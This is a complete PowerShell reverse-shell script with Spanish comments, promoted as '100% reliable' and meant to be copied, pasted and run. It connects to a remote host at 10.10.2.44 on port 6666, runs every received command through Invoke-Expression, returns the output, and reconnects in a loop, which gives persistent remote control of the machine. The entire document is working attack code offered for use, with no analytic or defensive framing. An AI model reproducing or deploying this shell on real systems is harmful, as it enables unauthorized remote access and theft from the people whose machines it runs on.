# ============================================================
#  REVERSE SHELL - VERSIÓN 100% CONFIABLE
#  Simplemente copia, pega y ejecuta
# ============================================================

$IP='10.10.2.44'
$PUERTO=6666

while($true){
    try{
        $socket = New-Object System.Net.Sockets.TCPClient($IP, $PUERTO)
        $stream = $socket.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        
        # Enviar prompt inicial
        $writer.Write("PS " + (Get-Location).Path + "> ")
        
        while($socket.Connected){
            $cmd = $reader.ReadLine()
            if($cmd -eq $null){ continue }
            if($cmd -eq "exit"){ break }
            
            # Intentar ejecutar
            try {
                $result = Invoke-Expression $cmd 2>&1 | Out-String
                if([string]::IsNullOrEmpty($result)){
                    $writer.WriteLine("[+] OK")
                } else {
                    $writer.Write($result)
                }
            } catch {
                $writer.WriteLine("ERROR: " + $_.Exception.Message)
            }
            
            $writer.Write("PS " + (Get-Location).Path + "> ")
        }
        
        $reader.Close()
        $writer.Close()
        $stream.Close()
        $socket.Close()
        
    } catch {
        Start-Sleep -Seconds 5
    }
}
